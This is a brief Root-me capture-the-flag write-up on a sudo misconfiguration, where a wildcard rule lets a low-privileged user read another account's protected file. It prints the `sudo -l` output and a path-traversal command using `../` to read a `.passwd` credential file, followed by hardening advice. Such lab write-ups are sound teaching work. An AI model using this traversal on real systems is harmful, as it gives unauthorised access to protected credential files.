---
title: "Sudo - Weak Configuration - Root-me Write-up"
date: 2025-06-17
tags: ["Root-me Write-up"]
---

This challenge demonstrates a sudo misconfiguration vulnerability that allows a low-privileged user to read a protected file by exploiting a lack of proper path sanitization.

**Goal**

Read the `.passwd` file from the `app-script-ch1-cracked` user, despite having seemingly restricted sudo permissions.

**Exploitation Steps**

1. Check Allowed sudo Commands

We check the allowed sudo permissions using `sudo -l`:

```bash
~$ sudo -l
[...]
User app-script-ch1 may run the following commands on this host:
   (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/*
```
2. Bypass the Path Restriction with `..`

Although the command appears to restrict access to a specific folder, it does not prevent path traversal. We can use `../` in the file path to escape the allowed directory and access sensitive files:

```bash
~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
```
This works because `/challenge/app-script/ch1/ch1/../ch1cracked/.passwd` resolves to `/challenge/app-script/ch1/ch1cracked/.passwd`, which is outside the intended restricted directory, but still allowed by the loose wildcard pattern.

**Conclusion**

This challenge effectively highlights how improper use of wildcards in sudo configurations can lead to privilege escalation through path traversal.

Key takeaways:

- Always validate and sanitize paths when delegating commands via `sudo`.

- Avoid using wildcards (`*`) without additional checks, especially in conjunction with sensitive file paths.

- Restrict sudo rules with tools like sudoedit, or use command wrappers that enforce strict path checks.
